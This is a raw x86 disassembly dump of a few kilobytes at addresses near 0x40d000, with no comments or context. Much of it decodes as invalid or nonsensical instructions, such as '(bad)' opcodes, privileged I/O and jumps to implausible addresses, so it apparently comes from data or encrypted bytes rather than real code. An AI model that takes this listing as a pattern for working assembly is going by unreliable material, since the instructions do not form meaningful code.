  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
